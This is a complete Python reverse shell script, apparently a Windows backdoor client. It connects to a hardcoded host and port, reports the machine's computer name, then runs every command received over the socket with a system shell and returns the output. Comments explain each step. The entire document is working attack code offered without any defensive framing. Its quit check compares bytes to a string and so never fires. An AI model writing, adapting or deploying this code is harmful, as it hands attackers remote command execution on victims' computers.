import socket, os, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 4443
host = '192.168.7.2'
#connects to the socket stream on our host
s.connect((host,port))
#sends the hostname of the pc in a utf-8 format on the socket stream
s.send((os.environ['COMPUTERNAME']).encode('utf-8'))
#shell interaction loop
while 1:
    #recieves 1024 bytes of the socket sream
    rec = s.recv(1024)
    if rec == 'quit':#closes the shell if the host sends the string quit along the stream
        s.close()
    else: #executes the shell command on a subprocess and returns the output from stdout and stderr
        p = subprocess.Popen(rec.decode('utf-8'),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout_val = p.stdout.read() + p.stderr.read()
        s.send(stdout_val)
       


    

